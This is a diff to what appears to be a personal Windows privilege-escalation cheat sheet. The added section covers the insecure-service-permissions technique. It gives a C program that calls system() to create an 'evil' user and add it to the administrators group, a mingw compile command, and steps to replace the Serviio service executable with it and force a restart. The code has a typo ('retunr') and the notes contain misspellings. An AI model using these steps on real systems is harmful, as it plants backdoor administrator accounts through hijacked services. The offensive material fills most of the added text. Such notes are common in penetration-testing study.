@@ -252,15 +252,56 @@ Use: https://github.com/ohpe/juicy-potato
    * net user <user>
       *Password required
       *groups
+  * whoami /groups
  
- * Enumerating World Writable Directories:
+ * Insecure File Permissions:
+   ##### tasklist /SVC > process.txt
+     or with powershell
+   ##### Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
+   
+   ##### icacls "\<path>\\<file.exe>"
+ 
+   * if full access the User can modify it.
+   
+   Custom exploit:
+   #include <stdlib.h>
+   
+   int main (){
+     int i;
+     i = system ("net user evil Ev!lpass /add");
+     i = system ("net localgroup administrators evil /add");
+     
+     retunr 0;
+    }
+    
+    Compile from windows:
+    i686-w64-mingw32-gcc adduser.c -o adduser.exe
+ 
+     move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"
+     move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
+     
+     dir "C:\Program Files\Serviio\bin\"
+     
+     net stop Servilo
+     
+     if access denied try:wmic service where caption="Serviio" get name, caption, state, startmode
+       -> if Auto atrribute inside then will auto execute after reboot.
+       
+     whoami /priv
+     if SeShutdownPrivilege then we can restart machine:
+       * shutdown /r /t 0 
+       
+      net localgroup Administrators
+      
+* Unqoted Service Path:
+   
+ 
+ 
+* Enumerating World Writable Directories:
    ##### accesschk.exe -uws "Everyone" "C:\Program Files"
    
  * Applications installed versions:
    ###### wmic product get name, version, vendor
- 
- * Running processes
-   ##### tasklist /SVC > process.txt
    
  * Schedule tasks
    ##### schtasks /query /fo LIST /v > schedule.txt
